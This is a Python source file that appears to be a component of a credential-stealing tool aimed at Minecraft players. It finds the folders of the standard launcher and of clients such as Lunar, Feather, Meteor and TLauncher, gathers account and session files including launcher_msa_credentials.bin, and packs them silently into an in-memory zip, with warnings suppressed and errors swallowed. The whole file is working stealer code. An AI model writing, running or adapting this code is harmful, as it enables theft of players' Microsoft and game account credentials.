import os
import json
import shutil
import zipfile
import io

def get_minecraft_paths():
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    
    return {
        "Standard": os.path.join(roaming, '.minecraft'),
        "Lunar": os.path.join(os.environ['USERPROFILE'], '.lunarclient', 'offline', 'multiversion'),
        "Badlion": os.path.join(roaming, 'Badlion Client'),
        "Feather": os.path.join(roaming, '.feather'),
        "Meteor": os.path.join(roaming, '.minecraft', 'meteor-client'),
        "Impact": os.path.join(roaming, '.minecraft', 'Impact'),
        "Novoline": os.path.join(roaming, '.minecraft', 'Novoline'),
        "CheatBreaker": os.path.join(roaming, '.cheatbreaker'),
        "TLauncher": os.path.join(roaming, '.minecraft')
    }

def grab_minecraft_sessions():
    paths = get_minecraft_paths()
    session_files = []
    
    # Files to look for
    critical_files = [
        'launcher_profiles.json',
        'launcher_accounts.json',
        'launcher_msa_credentials.bin',
        'launcher_profiles_microsoft_store.json',
        'usercache.json',
        'accounts.json' # Used by many clients like Meteor/Feather
    ]
    
    for name, path in paths.items():
        if os.path.exists(path):
            count = 0
            for root, dirs, files in os.walk(path):
                # Don't go too deep
                if root.count(os.sep) - path.count(os.sep) > 3:
                     continue
                     
                for file in files:
                    if file in critical_files:
                        file_path = os.path.join(root, file)
                        entry_name = f"{name}_{file}"
                        if count > 0:
                            entry_name = f"{name}_{count}_{file}"
                        session_files.append((entry_name, file_path))
                        count += 1
                        
    if not session_files:
        return None
        
    try:
        import warnings
        warnings.filterwarnings("ignore", category=UserWarning)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for arcname, full_path in session_files:
                try:
                    # Prevent duplicates by adding path hint if name exists
                    existing = [z.filename for z in zipf.filelist]
                    if arcname in existing:
                         # Append a random string or counter to ensure uniqueness
                         import random as _rnd, string as _str
                         suffix = "".join(_rnd.choices(_str.digits, k=3))
                         arcname = f"{suffix}_{arcname}"
                    zipf.write(full_path, arcname=arcname)
                except: pass
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None

def get_minecraft_report():
    paths = get_minecraft_paths()
    found = []
    for name, path in paths.items():
        if os.path.exists(path):
            found.append(name)
            
    if not found:
        return "No Minecraft clients found."
        
    report = "╔════════════════════════════════════════╗\n"
    report += "║           MINECRAFT CLIENTS            ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for client in found:
        report += f"║ FOUND: {client.ljust(31)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
